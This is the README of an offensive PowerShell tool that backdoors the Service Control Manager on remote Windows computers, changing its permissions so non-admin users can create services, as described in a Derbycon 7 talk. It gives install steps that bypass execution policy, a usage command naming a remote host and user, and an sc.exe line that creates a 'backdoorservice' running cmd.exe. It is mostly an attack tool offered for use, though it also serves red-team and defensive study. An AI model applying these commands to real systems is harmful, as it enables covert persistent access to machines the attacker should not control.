# SCManagerBackdoor
SCManagerBackdoor Script as described in An ACE in the Hole talk Derbycon7
Sets permissions on SCManager on remote computers so that non-admin users can create a backdoor service. Can be used to Backdooring a remote computer.
Will Require local administrator rights on remote computer to backdoor SCManager

# Install
Set-ExecutionPolicy Bypass
Import-Module Set-SCManagerBackdoor

# Usage
Set-SCManagerBackdoor -RemoteComputer "IP\remotecomp.domain.com" -Username "domain\myusername"

sc.exe \\Remote-Computer create backdoorservice binpath= C:\Windows\system32\cmd.exe

# ToDo
MayBe Add functionality add service as well with Delete privileges
https://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx#access_rights_for_the_service_control_manager

# Credits
@harmj0y
@wald0
@vysec
